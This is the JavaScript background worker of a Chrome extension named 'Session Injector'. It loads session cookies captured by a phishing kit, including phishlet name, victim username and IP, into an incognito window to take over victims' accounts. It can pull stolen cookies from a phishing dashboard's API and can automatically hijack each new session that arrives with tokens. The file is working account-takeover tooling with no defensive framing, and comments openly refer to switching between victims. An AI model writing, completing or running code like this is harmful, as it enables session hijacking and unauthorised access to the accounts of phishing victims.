'use strict';
/* ============================================================================
   Session Injector - background service worker (MV3)

   Design goal
   -----------
   Turning a captured session into a usable browsing session must never disturb
   the profile you are already signed into. Chrome's `windows.create({incognito})`
   gives a genuinely separate cookie jar (no extra profile, no launcher), so the
   default mode writes the victim's cookies into that isolated store and opens the
   target there. Your own logins stay untouched, and closing the window throws the
   victim session away.

   Because every incognito window shares one jar, the isolated store is treated as
   "one live victim at a time": before writing, every cookie on the domains in the
   payload is cleared, so switching victims is clean rather than a merge.

   `here` mode keeps the old behaviour for people who want it: write into the
   normal profile and open a normal tab.
   ========================================================================== */

const DEFAULTS = { mode: 'isolated', autoOpen: false, dashboardUrl: '', user: '', pass: '' };
const K = {
  settings: 'settings',
  win: 'isolatedWindowId',
  kind: 'isolatedWindowKind',
  recent: 'recent',
  active: 'active',
  seen: 'seenIds',
  last: 'lastInject',
  store: 'incognitoStore',
  isolatedDomains: 'isolatedDomains',
};
const RECENT_MAX = 8;
const SEEN_MAX = 400;

/* ---------------------------------------------------------------- settings */
async function getSettings() {
  const got = await chrome.storage.local.get(K.settings);
  return Object.assign({}, DEFAULTS, got[K.settings] || {});
}
async function setSettings(patch) {
  const next = Object.assign({}, await getSettings(), patch);
  await chrome.storage.local.set({ [K.settings]: next });
  return next;
}

function badge(text, color) {
  try {
    chrome.action.setBadgeText({ text: text || '' });
    if (color) chrome.action.setBadgeBackgroundColor({ color });
  } catch (e) { /* badge is cosmetic */ }
}

/* ---------------------------------------------------------- isolated store */
async function liveWindow() {
  const got = await chrome.storage.local.get([K.win, K.kind]);
  if (got[K.win] == null) return null;
  try {
    const w = await chrome.windows.get(got[K.win]);
    return { id: w.id, incognito: got[K.kind] === 'incognito' };
  } catch (e) {
    await chrome.storage.local.remove([K.win, K.kind]);
    return null;
  }
}

async function ensureWindow() {
  const live = await liveWindow();
  if (live) return live;
  let w = null;
  let incognito = true;
  try {
    w = await chrome.windows.create({ incognito: true, focused: true, width: 1180, height: 840 });
  } catch (e) {
    // incognito disabled for the extension -> degrade, but say so
    incognito = false;
    w = await chrome.windows.create({ focused: true, width: 1180, height: 840 });
  }
  await chrome.storage.local.set({ [K.win]: w.id, [K.kind]: incognito ? 'incognito' : 'normal' });
  return { id: w.id, incognito };
}

chrome.windows.onRemoved.addListener(async (id) => {
  const got = await chrome.storage.local.get(K.win);
  if (got[K.win] === id) await chrome.storage.local.remove([K.win, K.kind, K.active, K.isolatedDomains]);
});

// Chrome exposes the incognito store as an opaque id (in practice "1"). Probe for
// it instead of hardcoding, and cache the answer.
async function isolatedStoreId() {
  const got = await chrome.storage.local.get(K.store);
  if (got[K.store]) return got[K.store];
  let id = '1';
  try {
    const all = await chrome.cookies.getAll({});
    const inc = all.find((c) => c.storeId && c.storeId !== '0');
    if (inc) id = inc.storeId;
  } catch (e) { /* default is fine */ }
  await chrome.storage.local.set({ [K.store]: id });
  return id;
}

/* ----------------------------------------------------------------- cookies */
function cookieURL(c) {
  const host = String(c.domain || '').replace(/^\./, '');
  return (c.secure ? 'https://' : 'http://') + host + (c.path || '/');
}

function sameSiteOf(c) {
  const s = String(c.sameSite || '').toLowerCase();
  if (s === 'strict') return 'strict';
  if (s === 'none' || s === 'no_restriction') return 'no_restriction';
  if (s === 'lax') return 'lax';
  return 'unspecified';
}

function cookieDetails(c, storeId) {
  const isHost = c.name.indexOf('__Host-') === 0;
  const isSecure = c.name.indexOf('__Secure-') === 0;
  const sameSite = sameSiteOf(c);
  const details = {
    url: cookieURL(c),
    name: c.name,
    value: c.value == null ? '' : String(c.value),
    path: c.path || '/',
    // __Host- demands host-only + path=/ + secure; __Secure- demands secure
    secure: !!(c.secure || isSecure || isHost || sameSite === 'no_restriction'),
    httpOnly: !!c.httpOnly,
    sameSite: sameSite,
  };
  if (!isHost && c.domain) details.domain = c.domain;
  if (!c.session && c.expirationDate) details.expirationDate = c.expirationDate;
  if (storeId) details.storeId = storeId;
  return details;
}

function domainsOf(cookies) {
  return Array.from(new Set((cookies || []).map((c) => String(c.domain || '').replace(/^\./, '')).filter(Boolean)));
}

// Wipe every cookie on the given domains in the target store. Callers pass the
// union of the *new* victim's domains and the domains the window already held, so
// switching victims never leaves a stale cookie behind.
async function clearDomains(domains, storeId) {
  let removed = 0;
  for (const d of domains) {
    let existing = [];
    try {
      const filter = storeId ? { domain: d, storeId } : { domain: d };
      existing = await chrome.cookies.getAll(filter);
    } catch (e) { existing = []; }
    for (const c of existing) {
      try {
        const opts = { url: cookieURL(c), name: c.name };
        if (storeId) opts.storeId = storeId;
        await chrome.cookies.remove(opts);
        removed++;
      } catch (e) { /* already gone */ }
    }
  }
  return removed;
}

async function applyCookies(cookies, storeId, clearList) {
  const res = { success: 0, failed: 0, cleared: 0, errors: [] };
  res.cleared = await clearDomains(clearList || domainsOf(cookies), storeId);
  for (const c of cookies) {
    try {
      const r = await chrome.cookies.set(cookieDetails(c, storeId));
      if (r) res.success++;
      else { res.failed++; res.errors.push(c.name + ' @ ' + c.domain + ': rejected'); }
    } catch (e) {
      res.failed++;
      res.errors.push(c.name + ' @ ' + c.domain + ': ' + e.message);
    }
  }
  return res;
}

/* ------------------------------------------------------------------- window */
function infoOf(payload, where) {
  return {
    id: payload.session_id,
    phishlet: payload.phishlet || '',
    username: payload.username || '',
    ip: payload.remote_addr || '',
    url: payload.target_url || '',
    count: (payload.cookies || []).length,
    at: Date.now(),
    where: where,
  };
}

async function openTabs(winId, payload) {
  const cardURL = chrome.runtime.getURL('session-card.html');
  const tabs = await chrome.tabs.query({ windowId: winId });
  let card = tabs.find((t) => t.url && t.url.indexOf(cardURL) === 0);
  if (!card) {
    card = await chrome.tabs.create({ windowId: winId, url: cardURL, pinned: true, index: 0 });
  }
  const target = tabs.find((t) => t.id !== card.id && t.url && t.url.indexOf(cardURL) !== 0);
  if (target) await chrome.tabs.update(target.id, { url: payload.target_url, active: true });
  else await chrome.tabs.create({ windowId: winId, url: payload.target_url, active: true });
}

/* ----------------------------------------------------------------- takeover */
async function takeover(payload, mode) {
  const st = await getSettings();
  const where = mode || st.mode || 'isolated';
  const cookies = payload.cookies || [];
  let res;

  if (where === 'here') {
    res = await applyCookies(cookies, undefined);
    res.where = 'this profile';
    if (payload.target_url) await chrome.tabs.create({ url: payload.target_url, active: true });
  } else {
    const win = await ensureWindow();
    const storeId = win.incognito ? await isolatedStoreId() : undefined;
    // also clear whatever the window held before: switching victims must not
    // merge two people's cookies together
    const prev = (await chrome.storage.local.get(K.isolatedDomains))[K.isolatedDomains] || [];
    const domains = Array.from(new Set(prev.concat(domainsOf(cookies))));
    res = await applyCookies(cookies, storeId, domains);
    res.where = win.incognito ? 'isolated window' : 'new window (incognito off)';
    await chrome.storage.local.set({
      [K.isolatedDomains]: domains,
      [K.active]: infoOf(payload, 'isolated'),
    });
    if (payload.target_url) await openTabs(win.id, payload);
    await chrome.windows.update(win.id, { focused: true });
  }

  const info = infoOf(payload, where);
  await remember(info, payload);
  await chrome.storage.local.set({ [K.last]: Object.assign({}, info, { failed: res.failed, where: res.where }) });

  if (res.success > 0) badge(String(res.success), '#2563eb');
  setTimeout(() => badge('', null), 4000);
  return res;
}

async function remember(info, payload) {
  const got = await chrome.storage.local.get(K.recent);
  const list = (got[K.recent] || []).filter((x) => x.id !== info.id);
  list.unshift(Object.assign({}, info, { cookies: payload.cookies || [], target_url: payload.target_url || '' }));
  await chrome.storage.local.set({ [K.recent]: list.slice(0, RECENT_MAX) });
}

/* ------------------------------------------- optional direct dashboard fetch */
function b64(s) {
  // UTF-8 safe: passwords with accents must not break the Basic header
  try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); }
}

function authHeaders(st) {
  if (st.user || st.pass) {
    return { Authorization: 'Basic ' + b64(st.user + ':' + st.pass) };
  }
  return {};
}

async function fetchSession(id) {
  const st = await getSettings();
  const base = (st.dashboardUrl || '').replace(/\/+$/, '');
  if (!base) return { error: 'no dashboard url set' };
  try {
    const r = await fetch(base + '/api/v1/sessions/' + encodeURIComponent(id) + '/cookies', {
      credentials: 'include',
      headers: authHeaders(st),
    });
    if (!r.ok) return { error: 'dashboard returned ' + r.status };
    const d = await r.json();
    if (!d.count) return { error: 'session has no cookies' };
    return d;
  } catch (e) {
    return { error: e.message };
  }
}

/* ------------------------------------------------------------ auto takeover */
async function seenNewSessions(list) {
  const got = await chrome.storage.local.get(K.seen);
  const known = got[K.seen] || null;
  const now = list.map((s) => s.id);
  const fresh = known ? list.filter((s) => known.indexOf(s.id) === -1) : [];
  await chrome.storage.local.set({ [K.seen]: now.concat(known || []).slice(0, SEEN_MAX) });
  return fresh;
}

/* ---------------------------------------------------------------- messaging */
async function onMessage(msg) {
  switch (msg && msg.action) {
    case 'inject': {
      const r = await takeover(msg.payload || {}, msg.mode);
      return r;
    }
    case 'injectById': {
      const d = await fetchSession(msg.id);
      if (d.error) return { error: d.error };
      return await takeover(d, msg.mode);
    }
    case 'sessions': {
      const fresh = await seenNewSessions(msg.list || []);
      const st = await getSettings();
      const withTokens = fresh.filter((s) => s.has_tokens);
      if (withTokens.length) {
        badge(String(withTokens.length), '#22c55e');
        setTimeout(() => badge('', null), 6000);
      }
      if (st.autoOpen && withTokens.length) {
        const d = await fetchSession(withTokens[0].id);
        if (!d.error) await takeover(d, 'isolated');
      }
      return { fresh: withTokens.length };
    }
    case 'dashboard':
      if (msg.url) await setSettings({ dashboardUrl: msg.url });
      return { ok: true };
    case 'settings':
      return await setSettings(msg.patch || {});
    case 'state': {
      const st = await getSettings();
      const win = await liveWindow();
      const got = await chrome.storage.local.get([K.recent, K.active, K.last]);
      return {
        settings: st,
        window: win,
        recent: got[K.recent] || [],
        active: got[K.active] || null,
        last: got[K.last] || null,
      };
    }
    case 'clearIsolated': {
      const win = await liveWindow();
      const got = await chrome.storage.local.get(K.isolatedDomains);
      let cleared = 0;
      if (win && got[K.isolatedDomains]) {
        const storeId = win.incognito ? await isolatedStoreId() : undefined;
        cleared = await clearDomains(got[K.isolatedDomains], storeId);
      }
      await chrome.storage.local.remove([K.active, K.isolatedDomains]);
      return { cleared };
    }
    default:
      return { error: 'unknown action' };
  }
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  onMessage(msg).then(sendResponse).catch((e) => sendResponse({ error: String(e && e.message || e) }));
  return true; // async
});
